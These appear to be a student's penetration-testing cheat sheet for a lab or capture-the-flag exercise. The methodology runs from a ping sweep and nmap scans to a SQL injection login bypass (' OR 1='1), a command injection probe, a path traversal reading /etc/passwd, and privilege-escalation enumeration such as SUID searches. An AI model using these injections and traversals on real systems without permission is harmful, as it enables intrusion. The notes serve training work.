#############################################
              ROT13 and BASE64
#############################################
methodology:
  step 1: always have notes open (draw.io)
    
Host Discovery
    for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
    from the closest machine to the network
Port Discovery
    nmap -Pn (-sT) -T4 <ip> -p80,22,4444,2222,4242,9999,3389,8080
  
Port Interrogation
    nc <ip> <port>
  
Web Recon:
    nikto -h <ip>
    nmap -St -T4 <ip> -p80 --script http-enum.nse   #money
    nmap -St -T4 <ip> -p80 --script discovery
    
    login page (USERNAMES/PASSWORDS, GOLDEN STATEMENT DOES NOT WORK):
      ' OR 1='1
      if no useful information try a get request
      f12 network tab
        find POST request
        go to request tab, click raw
        ? after the php in the url and paste the raw url from the request tab

    file read page:
      ; whoami            #if nothing command injection doesnt work :(
      /../../../../../../../../../../../../etc/passwd

POST EXPLOITATION
  bash or /bin/bash if not already
  whoami
  hostname
  which gdb
  sudo -l
  find / -type f -perm /4000 2>/dev/null 
  find / -type f -perm /2000 2>/dev/null 
  find / -type f -perm /6000 2>/dev/null 
  which gdb                       #if a box has gdb you will be doing a buffer overflow :(
 
  cat /etc/hosts
  









